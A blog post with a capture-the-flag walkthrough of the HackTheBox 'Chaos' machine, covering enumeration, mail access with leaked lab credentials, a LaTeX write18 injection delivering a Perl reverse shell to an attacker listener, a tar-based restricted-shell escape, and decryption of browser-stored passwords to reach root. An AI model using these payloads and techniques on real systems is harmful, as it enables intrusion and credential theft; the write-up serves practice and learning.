<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
  <head>
  <meta charset="utf-8" />
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>HackTheBox - WriteUp 3 &middot; Pat~ Pat~ Meow~</title>
  <meta name="description" content="HackTheBox 练手 - Chaos - Latex Privilege Escalation" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-123948588-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

  <style>
    body {
      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
    }
  </style>
</head>
  <body class="single-body">
    <nav class="nav-bar side-padding">
  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
  <div class="hamburger-menu">
    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
      <span></span>
      <span></span>
    </button>
    <ul id="menu" class="hamburger-menu-overlay">
      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
    </ul>
  </div>
</nav>
    <main class="content side-text-padding">
      <article class="post ">
        <header class="post-header">
        	<h1 class="post-title">HackTheBox - WriteUp 3</h1>
          <p class="post-date">Posted <time datetime="2019-05-14">May 14, 2019</time></p>
        </header>
        
        <picture class="post-figure">
            
            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
        </picture>
        
        

<h1 id="chaos">Chaos</h1>

<p>May the most difficult box since I entered the HTB.</p>

<h2 id="reference">Reference</h2>

<ul>
<li><a href="https://busylog.net/telnet-imap-commands-note/">https://busylog.net/telnet-imap-commands-note/</a></li>
<li><a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a></li>
</ul>

<h2 id="port-scan">Port Scan</h2>

<p>Run: <code>nmap -A -Pn -p1-65535 10.10.10.120</code></p>

<p>Return:</p>

<pre><code>PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3     Dovecot pop3d
|_pop3-capabilities: UIDL TOP STLS AUTH-RESP-CODE SASL PIPELINING RESP-CODES CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: post-login ID listed have STARTTLS LOGIN-REFERRALS more capabilities SASL-IR LITERAL+ OK Pre-login LOGINDISABLEDA0001 IMAP4rev1 IDLE ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: ID listed have OK LOGIN-REFERRALS more post-login SASL-IR LITERAL+ capabilities AUTH=PLAINA0001 Pre-login IMAP4rev1 IDLE ENABLE
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL TOP USER AUTH-RESP-CODE SASL(PLAIN) PIPELINING RESP-CODES CAPA
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
</code></pre>

<p>Directly access, showed &ldquo;Direct IP is not allowed.&rdquo;, I need a <code>Host</code> Header. Try <code>chaos</code> via CURL, failed; <code>chaos.htb</code>, success. Add this line to <code>/etc/hosts</code>.</p>

<h2 id="web-scan">Web Scan</h2>

<p>Download Dictionaries from:  <a href="https://github.com/dustyfresh/dictionaries">https://github.com/dustyfresh/dictionaries</a></p>

<p>Use <code>nikto</code> first, but got nothing.</p>

<p>Use <code>gobuster</code> (a dirbuster written in Go) using: <code>gobuster -u http://10.10.10.120 -w /root/dictlist/DirBuster-Lists/directory-list-2.3-medium.txt -x php,html,txt,htm</code>, get result:</p>

<pre><code>/index.html (Status: 200)
/wp (Status: 301)
/javascript (Status: 301)
</code></pre>

<p>Found a wordpress, next <code>wpscan -e --stealthy -o wpscan --url http://10.10.10.120/wp/wordpress/</code>,</p>

<pre><code>&lt;A lot of vulnerability here.&gt;

User(s) Identified:

human
 | Detected By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)
</code></pre>

<p>There&rsquo;s an encrypted post on the WP, just use <code>human</code> as password. Get Creds:</p>

<pre><code>Creds for webmail:

username – ayush

password – jiujitsu
</code></pre>

<h2 id="find-footprint-from-mail">Find footprint from mail</h2>

<p>Due the dovecot is disabled insecure connection by default, and we cannot find any webmail here. So use <code>openssl</code> instead.</p>

<p>Connect: <code>openssl s_client -connect chaos.htb:143 -starttls imap</code></p>

<p>Login: <code>&lt;RANDOM STRING AS CONNECTION ID&gt; login &lt;USRNAME&gt; &lt;PASSWD&gt;</code></p>

<p>Get all mailboxs: <code>&lt;RANDOM STRING AS CONNECTION ID&gt; LIST &quot;&quot; &quot;*&quot;</code></p>

<p>Select corresponding mailbox (only this one has a mail inside.): <code>&lt;RANDOM STRING AS CONNECTION ID&gt; SELECT Drafts</code></p>

<p>Select mail: <code>&lt;RANDOM STRING AS CONNECTION ID&gt; FETCH 1 (BODY)</code></p>

<p>Get the mail contents: <code>&lt;RANDOM STRING AS CONNECTION ID&gt; FETCH 1 BODY.PEEK[]</code></p>

<p>Don&rsquo;t forget to save the mail contents to local. After download, check the attachments and decodes using <code>base64 -d</code>.</p>

<h3 id="decrypt-the-data">Decrypt the data</h3>

<p>You&rsquo;ll find a password in the body, a encryptor Python 3 script without any dependencies, a encrypted text here.</p>

<p>Check the <code>encrypt.py</code> (Already add the corresponding dependency):</p>

<pre><code class="language-python">#!/usr/bin/env python3
# PyCrypto AES-128-CBC

from Crypto import Random
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os


def encrypt(key, filename):
    # Per Block: 64KiB
    chunksize = 64*1024
    # Original Filename: im_msg.txt
    outputFile = &quot;en&quot; + filename
    # fill the first X bits with 0 to let the string length == 16
    filesize = str(os.path.getsize(filename)).zfill(16)
    # Generarte IV
    IV = Random.new().read(16)

    # AES-512-CBC
    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            # Write the first 16 bytes as file original length
            outfile.write(filesize.encode('utf-8'))
            # write 17-32 bytes as IV
            outfile.write(IV)

            while True:
                # Each time read 64 bytes from the original file
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    # copy the original file and append zero to 16-bytes * n
                    chunk += b' ' * (16 - (len(chunk) % 16))
                
                # Write encrypted bytes
                outfile.write(encryptor.encrypt(chunk))


def getKey(password):
    # AES Encrypt password is SHA256-ed original password in hex form.
    # Original Password: sahay
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()
</code></pre>

<p>So, let me write a <code>decrypt.py</code>:</p>

<pre><code class="language-python">#!/usr/bin/env python3
# Pycrypto AES-128-CBC 

from Crypto.Cipher import AES
import os
from Crypto.Hash import SHA256

def getKey(password):
    # AES Encrypt password is SHA256-ed original password in hex form.
    # Original Password: sahay
    hasher = SHA256.new(password.encode('utf-8'))
    return hasher.digest()

def decrypt(key, filename):
    chunksize = 64 * 1024
    optFileName = &quot;temp&quot; + filename[2:]
    
    with open(filename, 'rb') as fie:
        with open(optFileName, 'wb') as fopt:
            originalFileSize = int(fie.read(16).decode('utf-8'))
            # equals to MemoryIOStream
            initialVector = fie.read(16)
            cipher = AES.new(key, AES.MODE_CBC, initialVector)
            while True:
                chunk = fie.read(chunksize)
                if len(chunk) == 0:
                    break
                fopt.write(cipher.decrypt(chunk))
     
    finalFileName = optFileName[4:]
    with open(optFileName, 'rb') as ftmp:
        tempf = ftmp.read(originalFileSize)
        with open(finalFileName, 'wb') as ffinal:
            ffinal.write(tempf)
    
    os.system('rm -f' + optFileName)
    
</code></pre>

<p>And run the decrypt script, after that, <code>base64 -d</code> again after you get the original text.</p>

<p>Found a link: <code>http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</code></p>

<h2 id="get-reverse-shell">Get Reverse Shell</h2>

<p>Open the page, found a <code>tex2pdf generator</code>. Check the reference I offered above, some Latex Commands are already blacklisted. There&rsquo;s three templates, the first one is totally invalid, the second one is normally but cannot be used here, the third one is what we want. If you didn&rsquo;t see any response here, please open the Web Developer Tools in your browser to get the generated PDF response.</p>

<p>The exploit code attached here:</p>

<pre><code class="language-bash">$ # On the Attacker
$ nc -lvp 8778
</code></pre>

<p>Submit this to the server:</p>

<pre><code class="language-latex">\immediate\write18{perl -e 'use Socket;$i=&quot;&lt;YOUR IP HERE&gt;&quot;;$p=8778;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'}
</code></pre>

<p>Use <code>python3</code> to get a tty-spawned shell: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>

<h2 id="get-normal-user">Get normal user</h2>

<pre><code class="language-bash">$ whoami
www-data
</code></pre>

<p>Next, <code>su ayush</code> with password <code>jiujitsu</code> and you&rsquo;ll found you only have <code>/opt/rbash</code>, a restricted bash.</p>

<p>Check <code>echo $PATH</code> found that your <code>PATH=/home/ayush/.app</code>, try <code>ls</code>, got <code>command-not-found</code>, try <code>dir</code> get: this directory only has <code>tar</code>, <code>ping</code>, <code>dir</code>, three executable files.</p>

<p>Use <code>tar</code> to escalate: <code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash</code></p>

<p>After you get escalated: <code>export PATH=$PATH:/usr/bin:/usr/local/bin:/bin:/sbin</code> to <code>cat /home/ayush/user.txt</code>.</p>

<h2 id="get-rooted">Get Rooted</h2>

<p>According to nmap, there&rsquo;s a webapp called &ldquo;Webmin&rdquo; on port 10000 with SSL. It should not sound strange to Linux administrators.</p>

<p>So, there&rsquo;s a <code>.mozilla</code> in the home and seems like two databases which may store credentials about the webapp. Try to decrypt using script here: <a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></p>

<blockquote>
<p>How to upload the script to the box? Simply open a HTTP server and <code>wget</code> it on the box.</p>
</blockquote>

<p>The master password is the same one as <code>su</code> used one. Then, you get stored credentials in webmin. Webmin authentication is running via Unix Authentication by default.</p>

<p>Now you have root and webmin. Do anything you want.</p>

<p>(Finished.) 2019.5.14</p>

      </article>
      <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </main>
    <nav class="end-nav side-padding">
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup2/" class="card blog-card" rel="bookmark" >
    
    <div class="card-img-container">
      <p class="card-img-overlay">Next Article</p>
      <picture>
        
        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
      </picture>
    </div>
    
  <article class="card-body">
    <h2 class="card-title">HackTheBox - WriteUp 2</h2>
    <p class="card-text">HackTheBox 练手 - Swagshop, Help</p>
    <div class="card-subtext muted-text">
      <p>Posted <time datetime="2019-05-13 513:00">May 13, 2019</time></p>
      <p>#tech </p>
    </div>
  </article>
</a>
      
      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
  Home
</a>
    </nav>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>
<script src="https://www.kmahyyg.xyz/js/core.js"></script>
<script>
  hljs.initHighlightingOnLoad();
</script>
  </body>
</html>